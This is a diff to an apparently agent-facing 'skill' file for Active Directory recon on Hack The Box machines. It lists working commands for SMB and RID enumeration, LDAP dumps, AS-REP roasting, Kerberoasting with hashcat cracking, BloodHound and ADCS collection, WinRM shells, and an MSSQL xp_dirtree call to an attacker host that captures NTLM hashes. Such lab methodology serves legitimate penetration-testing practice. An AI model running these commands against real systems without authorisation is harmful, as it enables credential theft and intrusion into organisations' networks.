@@ -1,132 +1,95 @@
 ---
 name: ad-recon
-description: Initial recon for HTB AD machines based on 0xdf methodology across Forest, Cicada, Active, Rebound, Manager, Resolute, Authority, EscapeTwo, Retro.
+description: Enumerate Active Directory services on a Windows target. Use when analyzing nmap/rustscan output, enumerating SMB shares, querying LDAP users, running rpcclient, AS-REP roasting, Kerberoasting, or starting recon on a new HTB Windows/AD machine.
+user-invocable: false
+allowed-tools: Read
 ---
 
-# AD Initial Recon
+# AD Recon
 
-## Port interpretation
-```
-53   → DNS (try zone transfer: dig axfr {DOMAIN} @{IP})
-88   → Kerberos → confirms DC
-135  → RPC
-139/445 → SMB
-389/636 → LDAP/LDAPS
-3268/3269 → Global Catalog
-5985/5986 → WinRM (shell if creds work)
-80/443/8080/8443 → Web (often intended entry point)
-1433 → MSSQL (xp_dirtree for Net-NTLMv2, xp_cmdshell if sa)
-3389 → RDP
-```
+Follow this order. Check "Already Executed" in context before running anything.
 
-## 1. SMB enumeration
+## 1. Port scan
+```
+rustscan -a {IP} --ulimit 5000 -- -sC -sV
+```
+Key: 88=Kerberos(DC), 389/636=LDAP, 445=SMB, 5985=WinRM, 1433=MSSQL, 80/443=Web
+
+## 2. SMB
 ```bash
-# null/anonymous
-netexec smb {IP} -u '' -p ''
-netexec smb {IP} -u '' -p '' --shares
-netexec smb {IP} -u 'a' -p '' --shares          # some DCs need any username
-smbclient -L //{IP} -N
-
-# authenticated
+netexec smb {IP} -u '' -p '' --shares           # null
+netexec smb {IP} -u 'a' -p '' --shares          # some DCs need any user
 netexec smb {IP} -u '{USER}' -p '{PASS}' --shares
-netexec smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus  # spider all shares
-
-# user enumeration via RID cycling (works even without null session)
-netexec smb {IP} -u '' -p '' --rid-brute
-netexec smb {IP} -u 'a' -p '' --rid-brute
+netexec smb {IP} -u '' -p '' --rid-brute        # user enum without creds
+netexec smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus
 ```
-Look for: welcome notes with default passwords, SYSVOL (GPP), non-standard shares, scripts
 
-## 2. LDAP enumeration
+## 3. LDAP
 ```bash
-# anonymous
 ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts
-ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' description
-
-# authenticated — dump everything
-ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap_dump/
 netexec ldap {IP} -u '{USER}' -p '{PASS}' --users
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --groups
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required   # Pre-Win2000 accounts
+ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' description
+ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap/
+netexec ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required
 ```
-**Always check descriptions** — passwords in descriptions is extremely common in HTB
+**Passwords in descriptions is the most common HTB credential find.**
 
-## 3. RPC
+## 4. RPC
 ```bash
 rpcclient -U '' -N {IP} -c 'enumdomusers'
-rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers'
-rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomgroups'
-rpcclient -U '{USER}%{PASS}' {IP} -c 'querydominfo'   # password policy
+rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers;enumdomgroups;querydominfo'
 ```
 
-## 4. Kerberos
+## 5. Kerberos
 ```bash
-# AS-REP roast (no creds needed, just usernames)
 netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
-impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
-
-# Kerberoast (needs creds)
 netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
-impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
-
-# User enumeration via Kerberos error codes
-kerbrute userenum --dc {IP} -d {DOMAIN} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum --dc {IP} -d {DOMAIN} usernames.txt
 ```
 
-## 5. BloodHound collection
+## 6. BloodHound
 ```bash
-# rusthound-ce — mandatory for ADCS data
-rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip
-
-# Python alternative
+rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip   # ADCS data
 bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip
-
-# Kerberos-only (no NTLM)
-bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip -k
 ```
 
-## 6. ADCS
+## 7. ADCS
 ```bash
 netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs
 certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
 ```
 
-## 7. WinRM
+## 8. WinRM / MSSQL
 ```bash
-netexec winrm {IP} -u '{USER}' -p '{PASS}'
 evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
-```
-
-## 8. MSSQL (if 1433 open)
-```bash
-netexec mssql {IP} -u '{USER}' -p '{PASS}'
 impacket-mssqlclient {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
-# Inside mssql:
-# EXEC xp_dirtree '\\{ATTACKER_IP}\share'   → captures Net-NTLMv2
-# EXEC xp_cmdshell 'whoami'                  → RCE if enabled/sa
+# Inside MSSQL: EXEC xp_dirtree '\\{ATTACKER}\share'  → Net-NTLMv2
 ```
 
-## 9. Web (if HTTP/HTTPS open)
+## 9. Web
 ```bash
 feroxbuster -u http://{IP} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ffuf -w subdomains.txt -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -fs {SIZE}
-# Always check: /robots.txt, /.git/, source code, config files
 ```
 
-## Clock skew fix (Kerberos requires <5min)
+## Clock skew fix (Kerberos needs <5min)
 ```bash
 sudo ntpdate {IP}
-sudo timedatectl set-ntp false
-sudo date -s "$(date -d "$(ntpdate -q {IP} | tail -1 | awk '{print $1, $2}')")"
 ```
 
-## HTB patterns (from 0xdf writeups)
-- **Cicada/Resolute**: Credentials in SMB shares or welcome notes → password spray
-- **Active**: GPP password in SYSVOL → decrypt with gpp-decrypt
-- **Forest**: RPC null session → user list → AS-REP roast
-- **Authority**: Open SMB share with Ansible playbooks → ansible-vault crack → creds
-- **Retro**: Pre-Win2000 machine account (passwordnotreqd) → password = lowercase hostname
-- **EscapeTwo**: MSSQL → broken Excel workbook → creds → xp_cmdshell
-- **Manager**: RID cycling → username as password spray → MSSQL → filesystem → ADCS
+## Gotchas
+- **Never skip web** — HTTP/HTTPS is often the intended entry point on HTB Windows boxes
+- **LDAP descriptions** — check every user's description field, passwords are hidden there constantly
+- **Pre-Win2000 accounts** — `passwordnotreqd=true` means password = lowercase hostname
+- **MSSQL guest auth** — try `netexec mssql {IP} -u '' -p ''` before assuming creds needed
+- **SMB null auth** — some DCs require a random username even for "null" session
+- See references/ for detailed patterns per service
+
+## Key References
+- https://www.ired.team — AD attack mechanics
+- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+- https://www.thehacker.recipes
+- https://github.com/ly4k/Certipy/wiki — ADCS ESC1-16
+- https://0xdf.gitlab.io — HTB AD writeups
